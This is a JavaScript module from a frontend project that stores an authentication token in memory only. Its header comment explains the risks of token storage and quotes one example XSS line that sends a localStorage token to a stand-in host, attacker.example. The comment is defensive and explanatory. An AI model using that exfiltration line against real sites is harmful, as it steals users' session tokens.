/**
 * httpOnlyStorage.js
 *
 * In-memory token store for the Eventra frontend.
 *
 * Security rationale
 * ------------------
 * Storing a JWT in localStorage or sessionStorage exposes it to any JavaScript
 * executing on the page. A single successful XSS payload such as:
 *
 *   fetch('https://attacker.example/?t=' + localStorage.getItem('token'))
 *
 * silently exfiltrates the token, allowing an attacker to impersonate the user
 * for the token's entire lifetime.
 *
 * The safest option is HttpOnly cookies set by the server: the browser sends
 * them automatically and JavaScript cannot read them at all. When the backend
 * sets `Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict`, the Axios
 * instance configured with `withCredentials: true` in `src/config/api.js`
 * sends the cookie on every request without any client-side token management.
 *
 * For flows where the backend returns the token in the response body (e.g.
 * the current Spring Boot setup), we keep the token **in JavaScript memory
 * only**. Memory storage is:
 *   - Cleared on tab/window close (no persistence across sessions).
 *   - Not accessible to other tabs or browser extensions.
 *   - Not persisted to disk in any browser-readable file.
 *   - Still vulnerable to XSS within the same tab — so pairing this with a
 *     strict Content-Security-Policy is the complementary defence.
 *
 * What we never do
 * ----------------
 *   ❌  localStorage.setItem('token', jwt)
 *   ❌  sessionStorage.setItem('token', jwt)
 *   ❌  document.cookie = 'token=' + jwt   (JS-readable cookie)
 *   ❌  Zustand persist middleware pointed at localStorage with a token field
 *
 * Non-sensitive data (display name, avatar URL, theme preference) may still
 * be stored in localStorage — those fields carry no authentication privilege.
 */

/** @type {string | null} */
let _token = null;

const inMemoryTokenStore = {
  /**
   * Saves the token in memory only.
   * @param {string} token
   */
  setToken(token) {
    if (typeof token !== 'string' || !token) return;
    _token = token;
  },

  /**
   * Returns the in-memory token, or null if not set.
   * @returns {string | null}
   */
  getToken() {
    return _token;
  },

  /**
   * Clears the in-memory token (call on logout or session expiry).
   */
  clearToken() {
    _token = null;
  },

  /**
   * Returns true if a token is currently held in memory.
   * @returns {boolean}
   */
  hasToken() {
    return _token !== null;
  },
};

export default inMemoryTokenStore;
